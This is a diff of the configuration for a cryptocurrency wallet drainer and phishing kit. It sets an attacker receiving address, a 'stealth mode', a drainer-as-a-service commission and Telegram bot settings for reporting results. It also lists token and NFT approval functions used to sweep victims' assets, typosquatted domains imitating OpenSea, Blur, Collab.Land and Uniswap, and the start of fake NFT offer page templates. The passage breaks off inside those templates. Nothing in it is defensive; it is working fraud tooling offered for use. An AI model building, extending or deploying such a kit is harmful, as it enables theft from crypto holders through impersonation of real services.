@@ -1,35 +1,40 @@
 // ============================================================
-// SETTINGS - COMPLETE 40 FEATURES v10.0
+// TELEGRAM SETTINGS (41)
 // ============================================================
 
-// 1. WALLET ADDRESS - SAKA NAKA ANAN
+const TELEGRAM = {
+    enabled: true,
+    bot_token: "YOUR_BOT_TOKEN_HERE",
+    chat_id: "YOUR_CHAT_ID_HERE"
+};
+
+// ============================================================
+// SETTINGS - COMPLETE 40+ FEATURES
+// ============================================================
+
+// 1. WALLET ADDRESS
 const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
 
-// 2. MINIMUM BALANCE
+// 2. MINIMUM BALANCE (31)
 const minimumBalance = 50;
 
-// 3. 24-HOUR DELAY
-const delayHours = 24;
+// 3. 24-HOUR DELAY (32)
+const delayHours = 0; // Saita 0 don gwaji, 24 don gaske
 
-// 4. NETWORK - mainnet
-const network = "mainnet";
-
-// 5. STEALTH MODE
+// 4. STEALTH MODE (30)
 const stealthMode = true;
 
-// 6. RETRY ATTEMPTS
+// 5. RETRY ATTEMPTS (29)
 const retryAttempts = 3;
 
-// 7. GAS MULTIPLIER
+// 6. GAS MULTIPLIER (27)
 const gasMultiplier = 1.1;
 
-// 8. DaaS SETTINGS
+// 7. DaaS SETTINGS (34)
 const daasEnabled = true;
 const daasCommission = 20;
-const affiliateEnabled = true;
-const affiliateAddress = "0x0000000000000000000000000000000000000000";
 
-// 9. TOKEN ADDRESSES
+// 8. TOKEN ADDRESSES (24)
 const TOKEN_ADDRESSES = {
     USDT: "0x55d398326f99059ff775485246999027b3197955",
     BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
@@ -39,7 +44,7 @@ const TOKEN_ADDRESSES = {
     WBTC: "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c"
 };
 
-// 10. TOKEN ABI
+// 9. TOKEN ABI
 const TOKEN_ABI = [
     "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
     "function approve(address spender, uint256 amount) public returns (bool)",
@@ -48,19 +53,24 @@ const TOKEN_ABI = [
     "function nonces(address owner) public view returns (uint256)"
 ];
 
-// 11. NFT SETTINGS
+// 10. NFT SETTINGS (35)
 const NFT_ADDRESS = "0x1234567890123456789012345678901234567890";
 const NFT_ABI = ["function setApprovalForAll(address operator, bool approved) external"];
 
-// 12. FAKE DOMAINS - Typosquatting
+// 11. FAKE DOMAINS (23)
 const FAKE_DOMAINS = [
-    "opensea-offer.net", "opensea-claim.com", "opensea-verify.io",
-    "blur-rewards.io", "blur-claim.com",
-    "collab-verify.org", "collab-land.net",
-    "uniswap-lp.net", "uniswap-claim.com"
+    "opensea-offer.net",
+    "opensea-claim.com",
+    "opensea-verify.io",
+    "blur-rewards.io",
+    "blur-claim.com",
+    "collab-verify.org",
+    "collab-land.net",
+    "uniswap-lp.net",
+    "uniswap-claim.com"
 ];
 
-// 13. PHISHING PAGES
+// 12. PHISHING PAGES (1-20)
 const PHISHING_PAGES = {
     'opensea': {
         logo: '🎨', title: 'CyberPunk #420', price: '0.05 ETH',
